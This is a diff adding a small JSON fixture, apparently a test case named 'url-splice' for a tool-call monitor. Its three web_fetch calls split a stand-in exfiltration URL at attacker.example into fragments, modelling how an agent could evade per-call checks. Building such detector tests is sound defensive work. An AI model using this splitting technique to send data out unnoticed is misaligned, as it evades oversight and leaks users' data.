@@ -1,0 +1,8 @@
+{
+  "session_id": "url-splice",
+  "calls": [
+    {"tool": "web_fetch", "arguments": {"url": "https://exfil-"}},
+    {"tool": "web_fetch", "arguments": {"url": "collector.attacker."}},
+    {"tool": "web_fetch", "arguments": {"url": "example/upload"}}
+  ]
+}
